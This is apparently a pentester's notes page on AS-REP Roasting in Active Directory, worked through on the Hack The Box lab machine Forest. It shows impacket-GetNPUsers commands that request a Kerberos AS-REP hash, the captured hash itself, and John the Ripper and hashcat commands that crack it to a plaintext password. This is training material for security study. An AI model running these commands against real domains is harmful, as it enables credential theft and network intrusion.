
# AS-REP Roasting

Targets user accounts in an Active Directory environment with the "Do not require Kerberos preauthentication" setting enabled. This allows us to target any known user without prior authentication.

Perform remotely with [GetNPUsers](../../14%20Impacket%20Tools/GetNPUsers.md)

Perform locally with [Rubeus](../0%20Tools/Local/Rubeus.md)

This is shown in [Forest][https://app.hackthebox.com/machines/Forest] 


### Checking

```
kali@kali ~> impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-26 18:32:23.241448  2019-09-23 07:09:47.931194  0x410200 
```

### Action
```
kali@kali ~> impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-10-26 18:33:54.048111  2019-09-23 07:09:47.931194  0x410200 


$krb5asrep$23$svc-alfresco@HTB.LOCAL:e3ec409e2c2d795d6ad9bfbf778d0b54$277c17b80be36ea44ed004891408c77aee65c865da10b0a6fee89dabeb58b1d7791908f9af37d88c29f55b3d48e3cff0a5cda05839158ba15a2af8840c0b1ea51bd806279b6199dea926bed98482416eed4cc80e9c7bdbd2f9850d3c6d7bcfb3063bb2d3a1482b3aaf905e561205f36792ae4e27fa8e9b53253960eeb7cb7ed3dfde7154c0b66fc0d90377440b3b67615d2b78fdc579bcd6838e8c4f16353dab4ee23c551b693c7214c36c8da13d423475fba80e4f3e5eb97659c638b807d2fdef7b7c6edffa6c11cd3c4078ca99a86fbf93c6d599306685ec9e3399034f750d12c2cc686137
```


## Hash cracking

#### John
```
kali@kali ~> john ASREProastables.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
```


#### Hashcat
```
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
```
